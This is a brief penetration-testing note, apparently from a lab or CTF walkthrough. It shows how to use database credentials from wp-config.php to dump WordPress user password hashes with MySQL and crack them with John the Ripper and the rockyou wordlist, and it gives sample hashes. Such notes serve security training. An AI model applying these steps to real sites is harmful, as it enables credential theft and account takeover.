If you have access to the DB by checking the wp-config.php file or other config files, try logging into the DB and search for the users and their hashed passwords.
Example:
```
mysql -u root -p
use wordpress;
select * from wp_users;
```

Copy the username and password into a file on your Kali box.
Example:
```
micheal:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
steven:$P$B6X3H3ykawf2oHuPsbjQiih5iJXqad.
```

Now run John to crack the passwords:
```
john wp-users.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

